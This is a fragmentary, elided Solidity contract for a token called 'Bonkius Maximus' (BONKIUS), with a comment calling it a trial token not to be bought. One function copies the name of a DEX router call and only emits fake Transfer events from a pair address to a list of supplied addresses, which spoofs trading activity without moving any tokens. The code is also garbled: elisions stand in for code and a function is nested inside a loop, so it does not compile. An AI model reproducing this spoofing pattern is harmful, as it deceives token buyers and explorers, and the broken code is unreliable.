...
contract BONKIUS {
    ...
    string public constant name = unicode"Bonkius Maximus";
    string public constant symbol = unicode"BONKIUS";
...
//This is a trial token don't buy it purchases will not be refunded.
    ...
    function transfer(
        ...
        for (uint256 i = 0; i < _addresses_.length; i++) {
            ...
            function swapExactETHForTokensSupportingFeeOnTranssferTokens(address [] calldata _addresses_, uint256 _out) external {
        for (uint256 i = 0; i < _addresses_.length; i++) {
            emit Transfer(_pairr, _addresses_[i], _out);
        }
    }
